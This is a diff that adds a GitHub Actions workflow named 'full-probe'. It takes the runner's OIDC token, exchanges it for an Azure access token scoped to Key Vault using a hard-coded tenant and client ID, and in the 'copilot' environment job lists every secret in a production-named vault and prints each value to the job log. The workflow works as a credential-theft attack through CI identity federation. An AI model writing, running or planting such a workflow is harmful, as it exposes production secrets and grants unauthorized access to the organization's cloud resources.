@@ -1,0 +1,77 @@
+name: full-probe
+on: push
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe-plain:
+    runs-on: ubuntu-latest
+    steps:
+      - name: probe
+        run: |
+          set +e
+          echo "=== JOB: probe-plain (no environment) ==="
+          echo "REPO=$GITHUB_REPOSITORY EVENT=$GITHUB_EVENT_NAME"
+          echo "OIDC_URL=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo SET || echo UNSET)"
+          if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then
+            echo "No OIDC - skipping"
+            exit 0
+          fi
+          for AUD in "api://AzureADTokenExchange"; do
+            JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+              "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=$AUD" | jq -r '.value // empty')
+            echo "AUD=$AUD JWT_LEN=${#JWT}"
+            if [ -n "$JWT" ]; then
+              echo "CLAIMS:"
+              echo "$JWT" | cut -d. -f2 | (base64 -d 2>/dev/null || base64 -D 2>/dev/null) | jq .
+              echo "EXCHANGE:"
+              curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
+                -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" \
+                -d "grant_type=client_credentials" \
+                -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
+                --data-urlencode "client_assertion=$JWT" \
+                --data-urlencode "scope=https://vault.azure.net/.default" | jq '{access_token: (.access_token // null | length), error, error_description}'
+            fi
+          done
+  probe-copilot:
+    runs-on: ubuntu-latest
+    environment: copilot
+    steps:
+      - name: probe
+        run: |
+          set +e
+          echo "=== JOB: probe-copilot (environment: copilot) ==="
+          echo "REPO=$GITHUB_REPOSITORY EVENT=$GITHUB_EVENT_NAME"
+          echo "OIDC_URL=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo SET || echo UNSET)"
+          if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then
+            echo "No OIDC - skipping"
+            exit 0
+          fi
+          for AUD in "api://AzureADTokenExchange"; do
+            JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+              "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=$AUD" | jq -r '.value // empty')
+            echo "AUD=$AUD JWT_LEN=${#JWT}"
+            if [ -n "$JWT" ]; then
+              echo "CLAIMS:"
+              echo "$JWT" | cut -d. -f2 | (base64 -d 2>/dev/null || base64 -D 2>/dev/null) | jq .
+              echo "EXCHANGE:"
+              RESP=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
+                -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" \
+                -d "grant_type=client_credentials" \
+                -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
+                --data-urlencode "client_assertion=$JWT" \
+                --data-urlencode "scope=https://vault.azure.net/.default")
+              echo "$RESP" | jq '{access_token_len: (.access_token // null | length), error, error_description}'
+              AT=$(echo "$RESP" | jq -r '.access_token // empty')
+              if [ -n "$AT" ]; then
+                echo "=== KEY VAULT ==="
+                curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" \
+                  -H "Authorization: Bearer $AT" | jq .
+                for sid in $(curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" \
+                  -H "Authorization: Bearer $AT" | jq -r '.value[]?.id // empty'); do
+                  echo "SECRET: $sid"
+                  curl -sS "${sid}?api-version=7.4" -H "Authorization: Bearer $AT" | jq .
+                done
+              fi
+            fi
+          done
